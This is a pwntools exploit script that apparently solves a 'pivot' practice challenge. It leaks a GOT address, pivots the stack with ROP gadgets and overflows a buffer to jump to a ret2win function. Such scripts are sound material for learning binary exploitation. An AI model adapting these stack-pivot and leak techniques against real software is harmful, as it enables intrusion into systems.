from pwn import *

context.log_level = "debug"
context.terminal = ["wezterm", "start", "--"]

bin = b"./pivot"
p = process(bin)
# gdb.attach(p, api=True)
e = ELF(bin)
rop = ROP(e)

# Plan:
#
# 1. Read the leaked pivot address
# 2. Send a big ROP chain that's executed after the stack pivot that:
#
#    - Calls foothold_function@plt to resolve it in the GOT (our binary imports it so we can call it)
#    - Call `puts@plt` to leak the resolved `foothold_function` from the GOT
#    - Return to `main`
#
# 3. Send a small ROP chain that pivots the stack:
#
#    - `pop rax; ret`: put the leaked pivot address in RAX
#    - `[pivot_addr]`
#    - `xchg rsp, rax; ret`: pivot the stack to RAX
#
# 4. Compute the `ret2win` address as leaked `foothold_function` + 0x117 (offset in `libpivot`)
# 5. Send the final overflow that jumps to `ret2win`

# Gadgets:
# 0x00000000004009bb : pop rax ; ret
pop_rax_ret_addr = rop.find_gadget(["pop rax", "ret"]).address
info(f"pop rax ret addr: {hex(pop_rax_ret_addr)}")
# 0x00000000004009bd : xchg rsp, rax ; ret
xchg_rsp_rax_addr = 0x4009BD  # pwntools can't find sufficiently complex gadgets...
info(f"xchg rsp rax addr: {hex(xchg_rsp_rax_addr)}")
# 0x00000000004006b0 : call rax
call_rax_addr = 0x4006B0
info(f"call rax addr: {hex(call_rax_addr)}")
# 0x0000000000400a33 : pop rdi ; ret
pop_rdi_ret_addr = rop.find_gadget(["pop rdi", "ret"]).address
info(f"pop rdi ret addr: {hex(pop_rdi_ret_addr)}")
ret_addr = rop.find_gadget(["ret"]).address
info(f"ret addr {ret_addr}")

# PLT/GOT:

foothold_function_plt = e.plt["foothold_function"]
info(f"foothold_function PLT is {hex(foothold_function_plt)}")
foothold_function_got = e.got["foothold_function"]
info(f"foothold_function GOT (before) is {hex(foothold_function_got)}")
puts_plt = e.plt["puts"]
info(f"puts is {hex(puts_plt)}")

# Main addr to loop back to after leak.
main_addr = e.symbols["main"]
info(f"main is {hex(main_addr)}")

# Capture the `pivot` leak.
p.recvuntil(b"pivot: ")
pivot_addr = int(p.recvline().strip().ljust(8, b"\x00"), 16)
info(f"pivot addr: {hex(pivot_addr)}")

# The big ROP chain
payload_a = p64(foothold_function_plt)
payload_a += p64(pop_rdi_ret_addr)
payload_a += p64(foothold_function_got)
payload_a += p64(puts_plt)
payload_a += p64(main_addr)
p.sendafter(b"> ", payload_a)

# pause()

# The small ROP chain
payload_b = b"B" * 40
payload_b += p64(pop_rax_ret_addr)
payload_b += p64(pivot_addr)
payload_b += p64(xchg_rsp_rax_addr)
p.sendafter(b"> ", payload_b)

# pause()

# Capture the `foothold_function` GOT leak
p.recvuntil(b"libpivot\n")
foothold_function_leak = p.recv(6).ljust(8, b"\x00")
info(f"foothold_function_resolved_addr is {hex(u64(foothold_function_leak))}")

# Calculate the `ret2win` addr with 0x117 offset (see `nm ./libpivot.so`)
ret2win_addr = u64(foothold_function_leak) + 0x117
info(f"ret2win is {hex(ret2win_addr)}")

# pause()

# FINAL

payload_a = b"A" * 100
p.sendafter(b"> ", payload_a)

payload_b = b"B" * 40
payload_b += p64(ret_addr)  # Align stack
payload_b += p64(ret2win_addr)
p.sendafter(b"> ", payload_b)

p.recvline()
